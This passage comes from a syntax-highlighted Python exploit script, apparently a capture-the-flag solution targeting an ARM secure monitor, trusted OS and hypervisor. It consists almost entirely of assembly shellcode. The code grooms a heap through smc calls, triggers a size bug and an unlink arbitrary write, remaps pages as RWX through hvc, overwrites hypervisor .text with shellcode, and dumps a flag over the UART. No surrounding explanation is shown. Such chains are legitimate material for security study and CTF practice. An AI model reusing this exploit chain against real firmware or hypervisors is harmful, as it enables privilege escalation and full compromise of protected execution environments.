</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((UART)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(UART)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x0, sp
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) <span style="color:#f92672">+</span> bytes(read_flag) <span style="color:#f92672">+</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x9, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x0, sp, x9 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x0]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x11]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x9, x9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_VA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_VA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>((WORLD_SHARED_MEM_PA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x9, #</span><span style="color:#e6db74">{</span>(WORLD_SHARED_MEM_PA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>((SEL0_shellcode_src)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x20, #</span><span style="color:#e6db74">{</span>(SEL0_shellcode_src)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    add x21, x9, #0xc // shellcode_dst, TCI buf payload
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    alloc_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // alloc(i, 0x20, b&#39;&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">3</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne alloc_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x25, #2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    free_loop:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // free 2, 1, 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov w2, w25
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk w2, #0x40, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x25, #</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        sub x25, x25, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne free_loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    //trigger the vuln
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0xffff, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0xffff, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>((TCI_Data_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x22, #</span><span style="color:#e6db74">{</span>(TCI_Data_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_tci:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8 // dst
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x22, x8 // src
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(TCI_Data)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_tci
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // unlink AAW trigger
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x20, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, 0x0010, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, 0x0050, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #16] // data + 4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #20] // this is needed to get out of the freelist loop.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    // get .text
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9] // cmd
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #5
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #4] // idx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz w2, #0x0000, lsl 16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk w2, #0x1900, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str w2, [x9, #8] // sz
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop_copy:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x21, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x20, x8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x8, x8, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x8, #</span><span style="color:#e6db74">{</span>len(SEL0_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop_copy
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x06, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, x10
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x0, #0x8300, lsl 16          
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x0, #0x05, lsl 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ldr x1, =0x2000000
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x2, #0x100
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    smc #0x1337
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x8, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">+=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x250</span><span style="color:#f92672">-</span> len(EL2_shellcode)) <span style="color:#f92672">+</span> TCI_Data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xc</span><span style="color:#f92672">+</span>EL2_shellcode
</span></span><span style="display:flex;"><span>entry <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc001e000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf0</span> 
</span></span><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc00091b8</span>
</span></span><span style="display:flex;"><span>IPA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2400</span> <span style="color:#f92672">|</span> (<span style="color:#ae81ff">0b11</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">6</span>) <span style="color:#75715e"># s2ap 11</span>
</span></span><span style="display:flex;"><span>DESC <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100000</span>
</span></span><span style="display:flex;"><span>EL2_TEXT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00007ffeffffa000</span>
</span></span><span style="display:flex;"><span>entry_user <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffffffffc0028000</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xfd0</span>
</span></span><span style="display:flex;"><span>user_val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2403</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x0020000000000000</span><span style="color:#75715e"># ap 01</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>EL2_shellcode_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7ffeffffc100</span>
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;nop&#39;</span>)<span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x400</span><span style="color:#f92672">//</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>EL1_shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x0, #1 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>((IPA)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x1, #</span><span style="color:#e6db74">{</span>(IPA)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>((DESC)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x2, #</span><span style="color:#e6db74">{</span>(DESC)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // PA 0x0000000040102000 RWX
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((entry_user)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(entry_user)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>((user_val)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x10, #</span><span style="color:#e6db74">{</span>(user_val)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    str x10, [x11] // IPA 0x0000000000002000 RW
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>((EL2_TEXT)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x11, #</span><span style="color:#e6db74">{</span>(EL2_TEXT)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movz x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #48
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #32
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>((EL2_shellcode_addr)<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #16
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    movk x12, #</span><span style="color:#e6db74">{</span>(EL2_shellcode_addr)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffff</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, lsl #0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x9, #0x0 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    loop:                  
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x2, x11, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add x1, x12, x9
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ldrb w0, [x1]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        strb w0, [x2]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        add w9, w9, #1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        cmp x9, #</span><span style="color:#e6db74">{</span>len(EL2_shellcode)<span style="color:#e6db74">}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        bne loop
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    hvc #0x1337 // trigger!!!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>cnt <span style="color:#f92672">=</span> len(EL1_shellcode)
</span></span><span style="display:flex;"><span>val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040000000036483</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">    mov x5, #-1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w4, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w3, #0x0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov w2, #3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov x1, #0x1000
